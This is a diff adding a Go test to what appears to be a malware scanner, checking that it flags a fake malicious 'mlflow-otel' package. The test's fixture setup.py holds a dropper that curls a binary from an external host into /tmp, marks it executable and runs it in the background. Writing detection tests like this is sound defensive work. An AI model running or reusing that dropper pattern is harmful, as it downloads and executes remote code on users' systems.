@@ -1513,6 +1513,40 @@ func TestScan_AsyncAPIMiasmaPayloadUnderNodeModules(t *testing.T) {
 	}
 }
 
+// TestScan_MLflowOtelSetupSource proves the normal walker recognizes the
+// campaign's source-distribution installer markers.
+func TestScan_MLflowOtelSetupSource(t *testing.T) {
+	root := t.TempDir()
+	packageRoot := filepath.Join(root, "mlflow-otel-instrumentor-1.1.0")
+	if err := os.MkdirAll(packageRoot, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	payload := filepath.Join(packageRoot, "setup.py")
+	raw := []byte(`
+URL = "https://file.freestorage-04.bond/boto3_utils.elf"
+os.system("curl " + URL + " -o /tmp/systemd-helper")
+os.system("chmod +x /tmp/systemd-helper")
+os.system("nohup /tmp/systemd-helper &")
+`)
+	if err := os.WriteFile(payload, raw, 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+	if err != nil {
+		t.Fatalf("scan: %v", err)
+	}
+	got := 0
+	for _, f := range res.Findings {
+		if f.RuleID == "mlflow-otel-systemd-helper-ioc" {
+			got++
+		}
+	}
+	if got != 1 {
+		t.Fatalf("mlflow-otel-systemd-helper-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+	}
+}
+
 // TestScan_XYQDramaSkillSetupSource proves the normal walker recognizes the
 // campaign's setup.py source markers.
 func TestScan_XYQDramaSkillSetupSource(t *testing.T) {
